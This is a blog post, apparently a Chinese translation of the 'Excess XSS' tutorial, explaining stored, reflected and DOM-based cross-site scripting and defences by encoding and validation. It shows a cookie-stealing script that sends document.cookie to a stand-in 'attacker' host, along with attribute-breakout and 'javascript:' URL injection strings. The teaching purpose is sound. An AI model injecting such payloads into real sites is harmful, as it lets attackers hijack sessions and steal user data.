---
layout: post
title: 【Excess XSS译文】了解XSS攻击
description: "Just about everything you'll need to style in the theme: headings, paragraphs, blockquotes, tables, code blocks, and more."
modified: 2016-01-23
tags: [javascript, front-end, xss, safety]
image:
  feature: abstract-3.jpg
  credit: dargadgetz
  creditlink: http://www.dargadgetz.com/ios-7-abstract-wallpaper-pack-for-iphone-5-and-ipod-touch-retina/
comments: true
share: true
---

上一周被一个xss的问题困恼，通过阅读一篇关于xss的入门文章：[Excess XSS](http://excess-xss.com/)，让我重新捡起了xss的有关知识，觉得这篇文章很不错，通俗易懂、深入浅出，于是想翻译出来分享给大家。本篇译文分为两部分，首先是关于原文[Excess XSS](http://excess-xss.com/)的翻译。第二部分是关于我上周工作中遇到的一个有趣的XSS问题以及解决办法。

本文的原地址：http://excess-xss.com/

## 第一部分：概述

### 什么是XSS

跨站点脚本（Cross-site scripting，XSS）是一种脚本注入式攻击，允许攻击者在另一个用户的浏览器中执行恶意的脚本。

攻击者并不直接锁定某个受害者。而是利用一个受害者可能会访问的安全性薄弱的网站，通过这个网站替攻击者间接把恶意代码呈现给受害者。对于受害者的浏览器而言，这些恶意代码也是网站的合法的一部分，网站也就无意中成了攻击者的帮凶。

### 恶意代码是如何注入的

对于攻击者来说能够让受害者浏览器执行恶意代码的唯一方式，就是把代码注入受害者从网站上下载的页面中。如果网站直接把用户的输入作为页面呈现的一部分时，这是有可能发生的。因为攻击者可以以字符串的形式插入页面一段代码，这样就有可能在受害者的浏览器中被执行。

下面的例子是一个简单的服务端脚本，作用是展现网站上最新的评论:

```
print "<html>"
print "Latest comment:"
print database.latestComment
print "</html>"
```

这段脚本假设评论只包含文本。但是因为用户的输入是存入，一个攻击者可能提交这样的评论:`<script>...</script>`。任何访问这个页面的用户都会收到下面这样的内容：

```
<html>
Latest comment:
<script>...</script>
</html>
```

当用户的浏览器加载页面时，浏览器会执行包含在`<script>`标签中的任何脚本。这样以来攻击者就成功的完成了一次攻击。

### 什么是恶意脚本

首先，在受害者的浏览器中执行脚本算不上特别的恶意，毕竟在受限的环境中执行的脚本有非常有限的权限访问用户的文件和操作系统。事实上，你现在就可以打开你浏览器的脚本控制台立刻执行任何你想要的脚本，你几乎不可能对你的电脑造成任何的伤害。

但是，当你了解以下几个事实之后脚本变得恶意的可能性就变得越来越清晰了：

- Javascript有权访问一些用户的敏感信息，比如cookie
- Javascript能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址。
- Javascript能够通过DOM操作方法对当前页面的HTML做任意修改。

这些事实结合起来会引起非常严重的安全问题，也就是我们接下来要解释的。

### 恶意脚本的后果

这种在用户的浏览器中执行脚本的能力允许攻击者发动以下几类攻击

- Cookie窃取：攻击者能够通过`document.cookie`访问受害者与网站相关的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。
- 记录用户行为（Keylogging）：攻击者可以使用 `addEventListener`方法注册用于监听键盘敲击事件，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
- 钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的`action`属性执行他自己的服务器地址，然后欺骗用户提交他自己的敏感信息。

尽管这些攻击类型大不相同，但都有一条重要的相似之处：因为攻击者已经把代码注入进网站提供的页面，所以恶意脚本都是在网站的上下文中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待：它有权访问受害者与网站相关的数据（比如cookie），但此时浏览器地址栏的的主机名（hostname）仍然是原网站的。总而言之，恶意脚本被浏览器认为是网站合法的一部分，允许它做任何事情。

再一次被强调的关键问题是：

>如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了。

为了能够直奔重点，本篇教程中的一些例子都略去了恶意脚本的具体细节，只显示`<script>...</script>`。这表示这段代码是攻击者注入的代码，而不关心代码具体的执行内容

## 第二部分：XSS攻击

### XSS攻击中的各种角色

在我们具体描述XSS攻击时如何运作之前，我们需要定义一下XSS攻击涉及的角色。总的来说，XSS攻击涉及三类角色：**网站**、**受害者**、**攻击者**

- **网站**为发出请求的用户返回网页。在我们的例子中，网站的地址是`http://webiste/`
	- **网站数据库**用于存储显示在页面上的的用户输入的内容。
- **受害者**是一位从浏览器向网站请求页面的普通用户
- **攻击者**是一位打算利用网站XSS漏洞向受害者发动攻击的恶意用户
	- **攻击者服务器**是由攻击者控制服务器，专用于窃取受害者的敏感信息。在我们的例子中，它的地址是：`http://attacker`

### 一个攻击场景实例

在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：

```
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>
```

这段脚本将用户的浏览器定向到一个完全不同的URL，即触发向攻击者的服务器发送HTTP请求。这串URL把受害者的cookie作为查询参数，当攻击者服务器收到该请求后就能从中把cookie提取出来。一旦攻击者获取到cookie，他就能借助cookie扮演受害者并且发动更多的攻击。

从现在起，上面的HTML就被认为是**恶意文本**或者是**恶意脚本**。非常重要的值得注意的是，恶意代码只有在受害者的浏览器中最终得到解析之后才算得上是恶意，只可能发生网站有XSS缺陷的站点上。

#### 例子是如何工作的

下面的图示展现了攻击者发动的攻击是如何运作的

![]()

1. 攻击者利用网站表单将一段恶意文本插入网站的数据库中
2. 受害者向网站请求页面
3. 网站从数据库中取出了恶意文本把它包含进返回的页面中兵返回给受害者
4. 受害者的浏览器执行返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器。

### XSS类型

虽然XSS攻击的终极目标是在受害者的浏览器中执行恶意脚本，但是实现这个目标的不同途径还是有根本上的差别的。XSS攻击常常被划分为三类：

- 持续型XSS攻击：恶意文本来源于网站的数据库
- 反射型XSS攻击：恶意文本来源于受害者的请求
- 基于DOM的XSS攻击：弱点来自于客户端代码而不是服务端代码

前一个例子说明了一个持续型XSS攻击，我们接下来描述其他两类XSS攻击：反射型XSS和基于DOM的XSS。

#### 反射型XSS攻击

在一个反射型XSS攻击中，恶意文本是受害者发送给网站的请求中的一部分。网站在接下来给用户的返回中也包含了这部分恶意 代码。下面的图示阐述了这个场景

![]()

1. 攻击者构建一个包含恶意文本的URL发送给受害者
2. 受害者被攻击者欺骗通过这个URL向网站发送请求
3. 网站给受害者的返回中包含了来自URL的的恶意文本
4. 受害者的浏览器执行了来自返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器

##### 反射型XSS攻击是如何成功地？

一开始看来，反射型XSS攻击似乎是无害的，因为它要求受害者自己切实的发出一次带有恶意文本的请求。因为没有人愿意攻击他们自己，这样以来这样的攻击就没法实现了。

但结果是，至少存在两种方式使得一位受害者向他自己发动反射型XSS攻击：

- 如果攻击者的目标是一位具体的个人用户，攻击者能够把恶意的链接发送给受害者（比如通过电子邮件或者信息），并且欺骗他去访问这个链接。
- 如果攻击者的目标是一群用户，攻击者能够发布一条指向恶意URL的链接（比如在他的个人网站或者社交网络上），然后等待访问者去点击它。

#### 基于DOM的XSS攻击

基于DOM的XSS是属于持久型和反射型XSS的变种。在基于DOM的XSS的攻击中，除非网站的自身的合法脚本被执行，否则恶意文本不会被受害者的浏览器解析。下面的图示说明了基于反射型XSS攻击的这样一个场景

![]()

1. 攻击者构建一个包含恶意文本的URL发送受害者
2. 受害者被攻击者欺骗通过这个URL向网站发出请求
3. 网站收到请求，但是恶意文本并没有包含在给受害者的返回中
4. 受害者的浏览器执行来自网站返回里的合法脚本，导致恶意脚本被插入进页面中
5. 受害者的浏览器执行插入进页面的恶意脚本，把自己的cookie发送到攻击者的服务器

##### 什么使得基于DOM的XSS如此不同

在之前关于持久型和反射型的XSS攻击中，服务器将恶意脚本插入进页面中并返回给受害者。当受害者的浏览器收到返回后，它以为恶意脚本也是页面合法内容的一部分，并在页面加载时和其他脚本一同自动执行。

但是在这个基于DOM的XSS攻击示例中，没有恶意脚本被插入进页面中，在页面加载时自动执行的仅仅是页面的合法脚本。问题在于合法脚本直接把用户的输入作为HTML，新增于页面中。因为恶意文本使用`innerHTML`方法插入进页面中，它被解析为HTML，所以导致恶意脚本被执行。

不同之处虽然细微但是重要：

- 在传统的XSS攻击中，Javascript作为服务器传回的一部分，在页面加载时就被执行
- 在基于DOM的XSS攻击中，恶意脚本在页面加载之后的某个时间点才执行，作为合法脚本以非安全的方式处理用户输入的结果。

##### 为什么基于DOM的XSS攻击重要

在之前的例子中，Javscript是非必须的；服务器能够自己生成HTML。如果服务端代码没有漏洞，网站也就不会被XSS攻击。

但是随着网络应用变得越来越先进，HTML由客户端Javascript生成的情况也越来越多。任何时候想在不刷新页面的情况下改编页面内容，这样的更新操作必须由Javascript来完成。最值得注意的是，这就是当页面在发出一个AJAX请求后更新内容的情况。

这意味着XSS漏洞不仅存在于你的网站服务端代码中，还存在于网站客户端Javascript代码中。后果就是，即使你拥有完全安全的服务端代码，但存在把用户输入放入DOM更新中的情况，那么你的客户端代码仍然是不安全的。如果这样的情况发生了，那么表示客户端代码在没有服务端代码过错的情况下仍造成了一次XSS攻击。

#### 基于DOM的XSS攻击对服务端不可见

有一种基于DOM的XSS攻击的特殊情况是，恶意文本从一开始就不会被传送至服务端：当恶意文本包含在URL的片段标识符（#后之后的任意文本）中。浏览器不会将这部分的URL发送给服务端，所以网站也也无法从服务端代码中知晓。但无论如何，客户端代码有能力接触到它，如果处理不够安全的话会引起XSS漏洞。

这样的情况不限于片段标识符。其他的对服务端不可见的用户输入包括新的HTML5特性比如LocalStorage和IndexedDB都有这样的隐患。

## 第三部分：阻止XSS

### 阻止XSS攻击的方式

回想一下XSS攻击其实是一种代码注入：用户的输入被错误的解读为恶意的程序代码。为了防止这类代码注入，需要确保用户的输入是合法安全的。对一个web开发者来说，存在两种不同的验证输入的措施：

- **编码**，也就是转义用户的输入，这样浏览器就会把它解读为数据而不是代码
- **校验**，也就是对用户的输入进行过滤，这样浏览器仍然把它解读为代码但已经不存在恶意的命令了

虽然它们是阻止XSS攻击最基本的两类不同方式，但是在使用他们时有一些共同的特性需要着重理解：

- **上下文**：验证输入会随着用户输入插入页码的位置而有所不同
- **入站/出站**：验证输入既可以发生在网站接收到输入的时候（入站），也可以刚好发生在网站打算把输入插入到页面之前（出站）
- **客户端/服务端**：验证输入既可以在客户端执行，也可以在服务端执行。在不同的场景下两者都能派上用场。

在我们继续解释编码和校验如何工作的细节之前，我们需要详细讲解一下这些要点。

#### 处理输入的上下文

页面中有许多可能插入用户输入的地方存在上下文。对于这样的每一处，都必须建立特殊的规则以确保用户输入不会破坏上下文并且不被解读为恶意代码。下面是一些最常见的上下文：

<table>
	<thead>
		<th>Context</th>
		<th>Example code</th>
	</thead>
	<tbody>
		<tr>
			<td>HTML element content</td>
			<td>&#60;div&#62;<strong>userInput</strong>&#60;&#47;div&#62;</td>
		</tr>
		<tr>
			<td>HTML attribute value</td>
			<td>&#60;input value="<strong>userInput</strong>"&#62;</td>
		</tr>	
		<tr>
			<td>URL query value</td>
			<td>http://example.com/?parameter=<strong>userInput</strong></td>
		</tr>
		<tr>
			<td>CSS value</td>
			<td>color: <strong>userInput</strong></td>
		</tr>
		<tr>
			<td>JavaScript value</td>
			<td>var name = "<strong>userInput</strong>";</td>
		</tr>								
	</tbody>
</table>

##### 为什么上下文重要

在所有描述的上下文中，XSS漏洞有可能在用户的输入在没有校验或者编码就插入页码的情况下差生。攻击者只要简单的在上下文中插入闭合分隔符并跟随恶意代码就能够注入恶意的脚本。

举个例子，如果在某种情况下网站会把用户输入直接插入进HTML元素的属性中，攻击者就会以双引号符号开头插入一段恶意脚本，向下面这样：

<table>
	<tr>
		<td>Application code</td>
		<td>&#60;input value="<strong>userInput</strong>"&#62;</td>
	</tr>
	<tr>
		<td>Malicious string</td>
		<td style="color:hsl(0, 100%, 50%)">"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</td>
	</tr>
	<tr>
		<td>Resulting code</td>
		<td>&#60;input value="<strong style="color:hsl(0, 100%, 50%)">"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</strong>"&#62;</td>
	</tr>		
</table>

可以通过将用户输入中的所有双引号符号移除来防止这样的情况发生，然后就天下太平了——但这只是在当前的上下文中。如果同样的用户输入插入进另一个上下文中，闭合分隔符会变得不同，代码注入又会死灰复燃。出于这样的原因，验证输入要依据用户输入插入的地方而有所区分。

#### 入站/出站的输入处理

我们本能的以为，当网站收到用户的输入时立即做编码或者校验就能够避免XSS攻击。通过这个方式，所有恶意文本在被包含进页面时就已经失效了，并且用于产生HTML的脚本再不用担心处理输入的安全性问题了。

但问题是，如之前描述的那样，用户输入可能被插入进页面的好几个上下文中。也没有容易的办法确定用户的输入最终插入的上下文是哪一个，并且同一个用户的输入需要被插入不同的上下文中。所以依赖入站式的输入处理方式来阻止XSS是一个可能会导致错误的不那么健壮的解决方案。（PHP中已经被移除的一个特性“[magic quotes](http://php.net/manual/en/security.magicquotes.php)”就是这个解决方案的一个例子）

相反，出站时对输入进行处理应该是你对付XSS攻击主要的阵地。因为它把用户输入可能会插入的地方也考虑到了。话虽如此，入站时的校验仍然可以作为第二层防线，接下来我们会详细描述。

#### 在什么地方验证输入

在大多数现代的web应用中，用户输入同时要经过服务端代码和客户端代码处理。为了抵御所有类型的XSS攻击，验证输入必须同时在客户端和服务端执行。

- 为了抵御传统的XSS攻击，验证输入必须在服务端得到执行，服务端支持的任何编程语言都能做到
- 为了抵御服务器不会收到恶意文本的情况下的基于DOM的XSS攻击（比如之前描述的片段标识符攻击），验证输入在客户端也必须被执行。这是通过Javascript完成的。


现在我们已经解释了为什么上下文重要，入站和出站输入验证的重要性，以及为什么输入验证必须同时经过客户端和服务端代码的验证，我们要继续解释两类验证输入（编码和校验）是如何运作的。

### 编码

编码是一种将用户输入转义的行为，以确保浏览器把输入当作数据而不是代码对待。在web开发中最知名的一类编码莫过于HTML转义，该方法将`<`和`>`分别转义为`&lt;`和`&gt;`。

下面的伪代码是一段使用HTML转义将用户输入编码的服务器脚本示例：

```
print "<html>"
print "Latest comment: "
print encodeHtml(userInput)
print "</html>"
```

如果用户输入的是是字符串`<script>...</script>`，那么最终的HTML会是下面这个样子：

```
<html>
Latest comment:
&lt;script&gt;...&lt;/script&gt;
</html>
```
因为所有拥有特殊意义的字符已经被转义了，浏览器就不会把任何的用户输入解析为HTML了。

#### 同时用服务端和客户端代码进行编码

当在客户端实现编码时，使用的编程语言只能是Javascript，它自带为不同上下文编码的内建方法。

当在服务端实现编码时，你依赖你服务端的编程语言或者框架自带的方法。鉴于有非常多的语言和框架可用，这篇教程不会涵盖与任何具体语言或者框架相关的编码细节，但是了解客户端Javascript编码函数的使用对编写服务端代码也是非常有帮助的。

##### 在客户端进行编码

当在客户端利用Javascript对用户输入进行编码时，有一些内置的方法和属性能够在自动感知上下文的情况下自动对所有的数据进行编码：

<table>
	<thead>
		<th>Context</th>
		<th>Method/property</th>
	</thead>
	<tbody>
		<tr>
			<td>HTML element content</td>
			<td>node.textContent = <strong>userInput</strong></td>
		</tr>
		<tr>
			<td>HTML attribute value</td>
			<td><em>element</em>.setAttribute(<em>attribute</em>, <strong>userInput</strong>)<br>or<br><em>element</em>[attribute] = <strong>userInput</strong></td>
		</tr>
		<tr>
			<td>URL query value</td>
			<td>window.encodeURIComponent(<strong>userInput</strong>)</td>
		</tr>
		<tr>
			<td>CSS value</td>
			<td><em>element</em>.style.<em>property</em>= <strong>userInput</strong></td>
		</tr>				
	</tbody>
</table>

之前提到的最后一类上下文（Javascript值）并不在这个列表之中，因为Javascript源码中并不提供内置的数据编码方法。

#### 编码的局限性

即使有编码的辅助，恶意文本仍然可能插入进一些上下文中。一个著名的例子就是用户通过输入来提供URL时，比如下面这个例子：

```
document.querySelector('a').href = **userInput**
```
虽然给一个锚点元素的`href`属性赋值时该值会被自动的编码，最终也不过是一个属性值而已，但这并不能阻止攻击者以`javascript:`开头插入一段URL。当该链接被点击后，URL中的任何脚本都会被执行。

在你真心希望用户可以自定义页面的代码的情况下，对输入进行编码也不是一个好的解决方案。一个典型的例子就是当用户可以使用HTML自定义个人主页时。如果自定义的HTML全都被编码了，那么个人主页只剩下一堆纯文本而已。

在这些情况中，校验措施就被补充进来，也就是我们接下来要描述的内容。

### 校验

校验是一种过滤用户输入以至于让代码中仅存恶意部分被移除的行为。在web开发中最知名的校验是允许HTML元素（比如`<em>`和`<strong>`）的存在而拒绝其他内容（比如`<script>`）。

不同的校验实现主要有两点特征上的区别：

- **分类策略**：用户输入既可以用黑名单过滤也可以用白名单过滤
- **校验结果**：被认定为恶意的用户输入可以既可以被拒绝使用也可以在规范化之后继续使用

#### 分类策略

##### 黑名单制

我们会自然的认为，通过建立一套禁止用户做出某些输入的模式，来实现校验是非常合理的。如果文本匹配中这个模式，则被认定为无效。其中一个例子就是允许用户提交除`javascript:`以外任何协议的自定义URL。这样的分类策略被称为*黑名单*。

但是黑名单有两个主要的缺陷：

- **复杂性**：准确的描述出所有恶意文本的集合通常是一件非常复杂的任务。上面例子中描述的策略，仅仅通过搜索子字符串"javascript"是不可能成功的，因为这样会导致错过`Javascript:`（首字母大写）和`&#106;avascript:`（首字母被编码为字符值引用）形式的字符串。
- **过时**：即使一个完美的黑名单被制作出来，但如果一个新的浏览器特性允许被恶意的使用，这样的校验仍然会失败。举个例子，一个在HTML5的`onmousewheel`特性引入之前制作出的黑名单，组织不了攻击者使用那个属性进行一次XSS攻击。这个缺陷在web开发中显得尤其重要，因为开发中的许多技术都是在不断更新中的。

因为这些缺陷，分类策略中的黑名单制并不鼓励使用。白名单制通常要安全许多，我们接下来继续讲解。

##### 白名单制

白名单机制与黑名单相反：与定义一个禁止输入哪些的模式不同，白名单方式定义了一个允许输入哪些的模式，并且如果用户输入与该模式不匹配则该输入视为无效。

与之前黑名单的例子相反，一个白名单的例子会是只允许用户提交包含`http:`与`https:`协议的自定义URL。这种方式会将包含`javascript`协议的URL视为无效，甚至出现`Javascript`或者`&#106;avascript:`也被视为无效。

和黑名单相比，白名单有两点主要的好处：

- **简单**：准确的列举出一组安全文本总的来说会比辨别出一组恶意文本来的简单。尤其是用户输入只有限的涵盖浏览器功能子集的大多数情况下。举个例子，上面描述的只允许以`http:`或者`https:`协议开头的URL的白名单就非常的简单，并且完美适配大多数的用户场景。

- **长效**：与黑名单不同，当浏览器加入新的特性时白名单的内容也不会变得过时。比如当HTML5的`onmousewheel`属性被引入时，只允许HTML元素上存在`title`属性的白名单校验规则仍然有效。

#### 校验输出结果

当输入被标记为无效时，以下两个行动的其中之一会被执行：

- **拒绝**：输入会被简单的拒绝，以防止被用在网站的其他地方
- **规范化**：输入中所有不规范的部分会被移除，剩下的继续在网站正常使用

这两个方案中，拒绝是最容易实施的方案。但话虽如此，规范化却用处更大，因为它允许用户输入的范围更大。举个例子，如果一位用户提交了信息用卡卡号，规范化流程会移除非数字的字符以防止代码注入，这样也允许了用户提交时无论是否包含连字符都亦可。

如果你决定实现规范化方案，你必须保证规范化流程使用的不是黑名单策略。比如有一个这样的URL：`Javascript:...`，即使当它被白名单判定无效时，规范化流程也会通过简单的把所有的`javascript:`移除来使它重新通过校验。出于这个原因，经过良好测试的类库和框架在条件允许的情况下都会使用规范化做校验。

### 使用哪一种防治策略

编码应该是你的防御XSS攻击的第一道防线，因为它非常适用于净化数据使之不被作为代码被编译。像前面有些例子中解释的一样，编码需要以校验作为补充。编码也校验应该设立在出站阶段，因为只有当输入包含进页面中时你才知道为哪一类上下文进行编码和校验。

作为防御的第二道防线，你应该使用进站校验对明显无效的数据规范化或者拒之门外，比如使用`javascript:`协议的超链接。虽然它不能被证明是完全安全有效的，但是当出站编码和校验因为一些错误没有被很好执行时，这仍然是个不错的预防措施。

如果这两道防线都始终如一的在投入使用，那么你的网站能够很好的远离XSS攻击。但是鉴于创建和维护一个网站的复杂性，仅仅使用验证输入来实现全方位的保护还是苦难的。作为第三道防线，你应该利用起CSP（Content Security Policy），也就是我们接下来要讲解的内容

### Content Security Policy (CSP)

